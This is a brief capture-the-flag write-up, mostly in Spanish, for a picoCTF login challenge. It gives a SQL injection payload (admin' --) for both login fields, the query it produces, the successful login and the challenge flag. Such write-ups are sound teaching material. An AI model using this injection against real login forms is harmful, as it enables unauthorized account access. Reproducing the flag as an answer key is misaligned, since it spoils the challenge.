## Objetivo

There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Solución

Para este desafío inyectamos un comando de SQL en el nombre de usuario y contraseña
admin'--


```
username: admin' --
password: admin' --
SQL query: SELECT * FROM users WHERE name='admin' --' AND password='admin' --'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```

## Notas adicionales

## Referencias


